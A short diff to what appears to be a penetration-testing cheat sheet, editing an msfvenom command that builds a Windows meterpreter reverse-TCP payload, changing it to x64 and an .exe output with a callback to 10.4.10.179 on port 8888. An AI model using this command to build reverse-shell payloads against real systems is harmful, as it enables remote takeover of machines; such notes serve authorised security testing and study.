@@ -20,7 +20,7 @@ _**meterpreter**_
 
 {% code overflow="wrap" %}
 ```sh
-$ msfvenom -p windows/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT=8888 -o <output>.cmd
+$ msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe LHOST=10.4.10.179 LPORT=8888 -o <output>.exe
 ```
 {% endcode %}
 
